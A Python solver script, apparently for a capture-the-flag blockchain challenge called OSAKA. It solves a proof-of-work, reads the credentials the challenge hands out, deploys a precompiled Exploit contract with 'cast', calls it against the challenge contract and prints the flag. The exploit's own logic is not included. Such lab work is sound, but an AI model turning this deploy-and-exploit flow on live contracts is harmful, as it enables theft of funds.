import hashlib
import json
import os
import subprocess

from pwn import remote
from web3 import Web3

CHALLENGE_HOST = os.getenv("CHALLENGE_HOST", "localhost")
CHALLENGE_PORT = os.getenv("CHALLENGE_PORT", "31337")

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recvuntil(b"action? ")
r.sendline(b"1")


def solve_pow(r: remote) -> None:
    r.recvuntil(b'sha256("')
    preimage_prefix = r.recvuntil(b'"')[:-1]
    r.recvuntil(b"start with ")
    bits = int(r.recvuntil(b" "))
    for i in range(0, 1 << 32):
        your_input = str(i).encode()
        preimage = preimage_prefix + your_input
        digest = hashlib.sha256(preimage).digest()
        digest_int = int.from_bytes(digest, "big")
        if digest_int < (1 << (256 - bits)):
            break
    r.recvuntil(b"YOUR_INPUT = ")
    r.sendline(your_input)


solve_pow(r)

r.recvuntil(b"uuid:")
uuid = r.recvline().strip()
r.recvuntil(b"rpc endpoint:")
rpc_url = r.recvline().strip().decode()
r.recvuntil(b"private key:")
private_key = r.recvline().strip().decode()
r.recvuntil(b"your address:")
player_addr = r.recvline().strip().decode()
r.recvuntil(b"challenge contract:")
osaka_addr = r.recvline().strip().decode()
r.close()

web3 = Web3(Web3.HTTPProvider(rpc_url))

res = subprocess.run(
    [
        "cast",
        "send",
        "--private-key",
        private_key,
        "--rpc-url",
        rpc_url,
        "--json",
        "--create",
        json.loads(open("out/OSAKA.s.sol/Exploit.json").read())["bytecode"]["object"],
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
assert res.returncode == 0, res.stderr

exploit_addr = json.loads(res.stdout)["contractAddress"]
print("exploit address", exploit_addr)

res = subprocess.run(
    [
        "cast",
        "send",
        exploit_addr,
        "exploit(address)",
        osaka_addr,
        "--private-key",
        private_key,
        "--rpc-url",
        rpc_url,
        "--gas-limit",
        "4632905",
        "--json",
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
assert res.returncode == 0, res.stderr

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recv()
r.sendline(b"3")
r.recvuntil(b"uuid please: ")
r.sendline(uuid)
r.recvuntil(b"Here's the flag: \n")
flag = r.recvline().strip()
print(flag)
